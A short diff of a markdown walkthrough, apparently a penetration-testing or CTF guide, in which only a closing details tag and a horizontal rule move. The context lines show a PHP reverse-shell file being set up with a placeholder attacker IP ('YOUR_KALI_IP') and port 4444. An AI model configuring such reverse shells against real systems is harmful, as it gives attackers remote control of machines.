@@ -539,7 +539,9 @@ Edit the reverse shell file:
 ```php
 $ip = 'YOUR_KALI_IP';
 $port = 4444;
-</details>
 
+
+---
+</details>
 
 
